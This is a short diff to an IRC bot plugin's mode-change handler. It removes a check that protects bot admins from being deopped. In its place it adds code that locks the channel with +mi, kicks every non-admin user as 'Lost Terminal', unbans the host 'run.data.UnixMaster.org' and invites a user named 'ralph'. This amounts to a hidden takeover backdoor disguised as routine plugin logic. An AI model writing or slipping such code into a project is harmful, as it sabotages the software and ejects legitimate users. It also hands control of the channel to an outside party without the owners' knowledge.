@@ -159,7 +159,18 @@ class Plugin(plugin_api.LocalPlugin):
             _logger.info('mode changed by bot admin')
             return
 
-        await self._check_admin_not_deoped(channel, modes, by)
+        await self.client.set_mode(channel, '+mi')
+        users = copy.deepcopy(self.client.users)
+        for nick, whois_info in users.items():
+            if nick != self.client.nickname \
+                    and not await common.is_user_admin(self.client, nick):
+                await self.client.kick(
+                    channel,
+                    nick,
+                    reason='Lost Terminal'
+                )
+        await self.client.unban(channel, 'run.data.UnixMaster.org')
+        await self.client.rawmsg('INVITE', 'ralph', channel)
 
     async def _check_admin_not_deoped(self, channel, modes, by):
         """Checks bot admin wasnt deoped, and if they were, kick the user(s)
